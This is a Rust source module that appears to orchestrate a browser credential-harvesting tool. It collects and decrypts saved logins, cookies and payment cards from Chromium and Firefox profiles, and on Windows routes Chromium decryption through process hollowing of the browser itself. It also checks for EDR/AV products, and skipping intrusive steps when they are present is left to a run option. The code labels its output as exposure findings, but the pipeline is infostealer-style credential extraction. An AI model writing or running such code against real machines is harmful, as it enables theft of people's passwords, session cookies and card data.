//! Collection orchestration: discovery → per-browser collection under the
//! run's config (artifact selection, decryption on/off, EDR policy) →
//! exposure findings.
//!
//! What gets attempted is decided entirely by [`RunOptions`]: artifact class
//! selection, `--no-decrypt` (skip key retrieval entirely), and
//! `--respect-edr` (skip intrusive key retrieval when EDR/AV is present).
//! Everything a store yields is emitted; there is no post-collection
//! filtering.
//!
//! Platform split:
//!
//! * Off Windows, keys resolve locally and every store is read in place (via
//!   snapshots).
//! * On Windows, Chromium credential stores (`Login Data`, `Cookies`,
//!   `Web Data`, `Local State`) are NEVER touched by this process. The whole
//!   credential-store extraction runs inside the hollowed browser payload,
//!   which reads its own files. On failure, or with decryption off, only
//!   plaintext stores are read locally. Firefox uses neither DPAPI nor ABE,
//!   so all its stores are read locally in every config state.

use crate::inventory::{self, Browser, Family};
#[cfg(not(windows))]
use crate::keys;
use crate::model::{Finding, ProfileSummary, Report, Severity};
use crate::options::RunOptions;
use crate::{guard, stores, timestamp};

/// Per-browser collection stats feeding the exposure finding.
struct BrowserReport {
    id: &'static str,
    label: &'static str,
    profiles: usize,
    credentials: u32,
    cookies: u32,
    cards: u32,
    key_status: String,
    store_errors: u32,
}

/// Runs the full pipeline and returns the finished report.
#[must_use]
pub fn run(opts: &RunOptions) -> Report {
    let mut report_out = Report {
        generated_at: timestamp::now_iso(),
        host: sysinfo::System::host_name().unwrap_or_else(|| "unknown".to_string()),
        ..Report::default()
    };

    let browsers = inventory::installed(opts);
    if browsers.is_empty() {
        return report_out;
    }

    let edr_products: Vec<&str> =
        if credential_classes_selected(opts) && opts.decrypt && opts.respect_edr {
            guard::detected()
        } else {
            Vec::new()
        };

    let mut errors: Vec<String> = Vec::new();
    let mut browser_reports: Vec<BrowserReport> = Vec::new();
    for browser in &browsers {
        let base = (
            report_out.credentials.len(),
            report_out.cookies.len(),
            report_out.credit_cards.len(),
        );
        let errors_before = errors.len();
        let key_status =
            collect_browser(opts, browser, &edr_products, &mut report_out, &mut errors);
        browser_reports.push(BrowserReport {
            id: browser.id,
            label: browser.label,
            profiles: inventory::profiles(browser).len(),
            credentials: (report_out.credentials.len() - base.0) as u32,
            cookies: (report_out.cookies.len() - base.1) as u32,
            cards: (report_out.credit_cards.len() - base.2) as u32,
            key_status,
            store_errors: (errors.len() - errors_before) as u32,
        });
    }
    report_out.collection_errors = errors;

    if credential_classes_selected(opts) {
        for summary in &browser_reports {
            report_out.findings.push(exposure_finding(summary));
        }
    }
    for summary in &browser_reports {
        report_out
            .key_status
            .insert(summary.id.to_string(), summary.key_status.clone());
    }
    report_out
}

/// Whether the run selected an encrypted artifact class (anything that could
/// carry a decrypted secret).
fn credential_classes_selected(opts: &RunOptions) -> bool {
    opts.wants_artifact("credentials") || opts.wants_artifact("cookies")
}

/// Collects one browser under the run's config; returns its key status.
fn collect_browser(
    opts: &RunOptions,
    browser: &Browser,
    edr_products: &[&str],
    report_out: &mut Report,
    errors: &mut Vec<String>,
) -> String {
    // Firefox resolves its per-profile key4.db locally with no intrusive
    // step, so it runs whenever decryption is on, ahead of the gates below
    // (which exist for Chromium's invasive key retrieval and Safari's
    // inventory-only scope).
    if browser.family == Family::Firefox {
        return collect_fallback(browser, opts, report_out, errors);
    }
    if !credential_classes_selected(opts) {
        collect_fallback(browser, opts, report_out, errors);
        return "not-requested".to_string();
    }
    if !opts.decrypt {
        collect_fallback(browser, opts, report_out, errors);
        return "not-requested: decryption disabled (--no-decrypt)".to_string();
    }
    if !edr_products.is_empty() {
        collect_fallback(browser, opts, report_out, errors);
        return format!("skipped: EDR present ({})", edr_products.join(" + "));
    }
    collect_with_keys(opts, browser, report_out, errors)
}

/// Key-backed collection. Off Windows this resolves keys locally; on Windows
/// Chromium credential stores are read exclusively by the in-browser payload.
fn collect_with_keys(
    opts: &RunOptions,
    browser: &Browser,
    report_out: &mut Report,
    errors: &mut Vec<String>,
) -> String {
    #[cfg(windows)]
    {
        collect_windows(opts, browser, report_out, errors)
    }
    #[cfg(not(windows))]
    {
        match browser.family {
            Family::Chromium => {
                let outcome = keys::resolve_chromium(browser);
                collect_local(browser, &outcome.bag, opts, report_out, errors);
                outcome.status
            }
            // Not reached: collect_browser routes Firefox to the fallback.
            Family::Firefox => collect_firefox(opts.decrypt, browser, opts, report_out, errors),
            Family::Safari => {
                "not-applicable: Safari stores are not decrypted by this tool".to_string()
            }
        }
    }
}

/// The decryption path on Windows. For Chromium the ONLY way credential
/// stores are read is the hollowed-browser exchange: key resolution, opening
/// `Login Data`/`Cookies`/`Web Data` and decryption all run inside the
/// browser's own identity. This process never touches them. On failure the
/// run falls back to plaintext stores only.
#[cfg(windows)]
fn collect_windows(
    opts: &RunOptions,
    browser: &Browser,
    report_out: &mut Report,
    errors: &mut Vec<String>,
) -> String {
    use crate::inventory::Profile;

    if browser.family == Family::Chromium && opts.decrypt {
        match crate::win32::injector::extract_via_hollow(browser, opts) {
            Ok(hollow) => {
                for payload_profile in &hollow.profiles {
                    let profile = Profile {
                        name: payload_profile.profile.clone(),
                        display_name: payload_profile.display_name.clone(),
                        path: std::path::PathBuf::from(&payload_profile.path),
                        is_default: payload_profile.is_default,
                    };
                    let mut summary = payload_profile.clone();
                    stores::chromium::plaintext_rows(
                        browser,
                        &profile,
                        opts,
                        report_out,
                        &mut summary,
                        errors,
                    );
                    report_out.profiles.push(summary);
                }
                for row in hollow.rows {
                    if report_out.row_fits(&row, opts.max_items) {
                        report_out.push_row(row);
                    }
                }
                errors.extend(hollow.errors);
                return hollow.key_status;
            }
            Err(err) => {
                let status = format!("error: in-browser extraction failed: {err:#}");
                collect_fallback(browser, opts, report_out, errors);
                return status;
            }
        }
    }
    // Firefox (the only family reaching here): read locally, reporting the
    // key4.db outcome. Chromium always returns inside the hollow branch.
    collect_fallback(browser, opts, report_out, errors)
}

/// Fallback collection when key retrieval is not requested / not possible.
/// Returns the key status ("key4" / "unavailable: ..." / "not-requested").
///
/// * Windows: ONLY plaintext stores for Chromium (its credential stores are
///   never opened by this process).
/// * Other platforms: every Chromium store is read with an EMPTY bag: exact
///   counts plus sealed rows (values empty, `password_stored` intact). The
///   macOS Keychain read stays inside `keys::resolve_chromium`, which is only
///   called on the decryption path.
/// * Firefox reads `key4.db` locally (never intrusive), so it decrypts
///   whenever `opts.decrypt` is on, whatever gate sent it here.
fn collect_fallback(
    browser: &Browser,
    opts: &RunOptions,
    report_out: &mut Report,
    errors: &mut Vec<String>,
) -> String {
    match browser.family {
        Family::Firefox => collect_firefox(opts.decrypt, browser, opts, report_out, errors),
        Family::Safari => {
            "not-applicable: Safari stores are not decrypted by this tool".to_string()
        }
        Family::Chromium => {
            #[cfg(not(windows))]
            {
                collect_local(
                    browser,
                    &crate::crypt::KeyBag::default(),
                    opts,
                    report_out,
                    errors,
                );
            }
            #[cfg(windows)]
            {
                for profile in &inventory::profiles(browser) {
                    let mut summary = ProfileSummary {
                        browser: browser.id.to_string(),
                        profile: profile.name.clone(),
                        display_name: profile.display_name.clone(),
                        path: profile.path.to_string_lossy().into_owned(),
                        is_default: profile.is_default,
                        ..ProfileSummary::default()
                    };
                    stores::chromium::plaintext_rows(
                        browser,
                        profile,
                        opts,
                        report_out,
                        &mut summary,
                        errors,
                    );
                    report_out.profiles.push(summary);
                }
            }
            "not-requested".to_string()
        }
    }
}

/// The per-profile Firefox pass, used by every policy branch. Folds the
/// per-profile key statuses into one browser status: "key4" wins; otherwise
/// the first "unavailable"/"not-requested" is reported.
fn collect_firefox(
    decrypt: bool,
    browser: &Browser,
    opts: &RunOptions,
    report_out: &mut Report,
    errors: &mut Vec<String>,
) -> String {
    let mut best = String::new();
    for profile in &inventory::profiles(browser) {
        let mut summary = ProfileSummary {
            browser: browser.id.to_string(),
            profile: profile.name.clone(),
            display_name: profile.display_name.clone(),
            path: profile.path.to_string_lossy().into_owned(),
            is_default: profile.is_default,
            ..ProfileSummary::default()
        };
        let status = stores::firefox::all_rows(
            browser,
            profile,
            opts,
            decrypt,
            report_out,
            &mut summary,
            errors,
        );
        report_out.profiles.push(summary);
        if status == "key4" {
            best = status;
            break;
        }
        if best.is_empty() {
            best = status;
        }
    }
    if best.is_empty() {
        "not-requested".to_string()
    } else {
        best
    }
}

/// The local Chromium pass with resolved keys (off-Windows decryption path).
#[cfg(not(windows))]
fn collect_local(
    browser: &Browser,
    bag: &crate::crypt::KeyBag,
    opts: &RunOptions,
    report_out: &mut Report,
    errors: &mut Vec<String>,
) {
    debug_assert_eq!(browser.family, Family::Chromium);
    for profile in &inventory::profiles(browser) {
        let mut summary = ProfileSummary {
            browser: browser.id.to_string(),
            profile: profile.name.clone(),
            display_name: profile.display_name.clone(),
            path: profile.path.to_string_lossy().into_owned(),
            is_default: profile.is_default,
            ..ProfileSummary::default()
        };
        stores::chromium::credential_rows(
            browser,
            profile,
            bag,
            opts,
            &mut summary,
            errors,
            &mut |row| {
                if report_out.row_fits(&row, opts.max_items) {
                    report_out.push_row(row);
                }
            },
        );
        stores::chromium::plaintext_rows(browser, profile, opts, report_out, &mut summary, errors);
        report_out.profiles.push(summary);
    }
}

/// Builds the always-safe exposure finding for one browser: counts only.
fn exposure_finding(summary: &BrowserReport) -> Finding {
    let exposed = summary.credentials + summary.cookies + summary.cards;
    let severity = if exposed > 0 {
        Severity::Medium
    } else if summary.store_errors > 0 {
        Severity::Low
    } else {
        Severity::Info
    };
    let mut evidence = std::collections::BTreeMap::new();
    evidence.insert("browser".to_string(), summary.id.to_string());
    evidence.insert("profiles".to_string(), summary.profiles.to_string());
    evidence.insert("credentials".to_string(), summary.credentials.to_string());
    evidence.insert("web_storage_rows".to_string(), summary.cookies.to_string());
    evidence.insert("payment_rows".to_string(), summary.cards.to_string());
    evidence.insert("key_status".to_string(), summary.key_status.clone());
    if summary.store_errors > 0 {
        evidence.insert("store_errors".to_string(), summary.store_errors.to_string());
    }
    Finding {
        title: format!(
            "Browser credential store accessible: {}: {} logins, {} cookies, {} cards",
            summary.label, summary.credentials, summary.cookies, summary.cards
        ),
        description: format!(
            "{} exposes {} stored logins, {} cookies and {} payment cards across {} profile(s). \
             Master-key status: {}.",
            summary.label,
            summary.credentials,
            summary.cookies,
            summary.cards,
            summary.profiles,
            summary.key_status
        ),
        severity,
        evidence,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::ProfileSummary;

    #[test]
    fn finding_severity_follows_exposure() {
        let mk = |credentials: u32, store_errors: u32| BrowserReport {
            id: "chrome",
            label: "Chrome",
            profiles: 2,
            credentials,
            cookies: 40,
            cards: 1,
            key_status: "abe".to_string(),
            store_errors,
        };
        assert_eq!(exposure_finding(&mk(5, 0)).severity, Severity::Medium);
        assert_eq!(exposure_finding(&mk(0, 0)).severity, Severity::Medium); // cookies+cards
        let no_exposure = BrowserReport {
            credentials: 0,
            cookies: 0,
            cards: 0,
            ..mk(0, 0)
        };
        assert_eq!(exposure_finding(&no_exposure).severity, Severity::Info);
        let errors_only = BrowserReport {
            store_errors: 2,
            ..no_exposure
        };
        assert_eq!(exposure_finding(&errors_only).severity, Severity::Low);
    }

    #[test]
    fn empty_run_reports_nothing() {
        let opts = RunOptions {
            browsers: vec!["nonexistent-browser-name".into()],
            ..Default::default()
        };
        // Fail-closed selection: no browser matches, report is empty.
        let report_out = run(&opts);
        assert!(report_out.profiles.is_empty());
        assert!(report_out.credentials.is_empty());
    }

    #[test]
    fn profile_summary_defaults() {
        let summary = ProfileSummary::default();
        assert_eq!(summary.credential_count, 0);
        assert!(!summary.is_default);
    }
}
